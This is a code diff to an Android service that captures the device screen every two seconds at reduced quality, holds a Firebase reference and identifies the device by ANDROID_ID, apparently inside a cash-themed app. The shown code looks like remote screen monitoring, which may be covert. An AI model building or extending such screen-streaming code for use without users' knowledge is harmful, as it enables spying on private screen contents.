@@ -3,6 +3,7 @@ package com.my.Refiner.Cash.User;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
@@ -14,6 +15,7 @@ import android.media.projection.MediaProjectionManager;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
@@ -33,14 +35,14 @@ import java.util.Map;
 public class LiveScreenService extends Service {
 
     private static final String TAG = "LiveScreenService";
-    private static final long INTERVAL = 2000; // ২ সেকেন্ড
-    private static final int QUALITY = 40; // JPEG quality
+    private static final long INTERVAL = 2000;
+    private static final int QUALITY = 40;
 
     private MediaProjection mediaProjection;
     private VirtualDisplay virtualDisplay;
     private ImageReader imageReader;
     private int screenWidth, screenHeight, dpi;
-    private int width, height; // half-res
+    private int width, height;
     private String deviceId;
     private DatabaseReference dbRef;
     private Handler handler;
@@ -52,8 +54,15 @@ public class LiveScreenService extends Service {
     public void onCreate() {
         super.onCreate();
         dbRef = FirebaseDatabase.getInstance().getReference();
-        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
-                .getString("device_id", "unknown");
+
+        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
+        deviceId = prefs.getString("device_id", null);
+        if (deviceId == null || deviceId.equals("unknown")) {
+            deviceId = Settings.Secure.getString(
+                    getContentResolver(), Settings.Secure.ANDROID_ID);
+            prefs.edit().putString("device_id", deviceId).apply();
+        }
+
         handler = new Handler(Looper.getMainLooper());
 
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
@@ -62,8 +71,6 @@ public class LiveScreenService extends Service {
         screenWidth = metrics.widthPixels;
         screenHeight = metrics.heightPixels;
         dpi = metrics.densityDpi;
-
-        // Half resolution — ডেটা কম হবে
         width = screenWidth / 2;
         height = screenHeight / 2;
     }
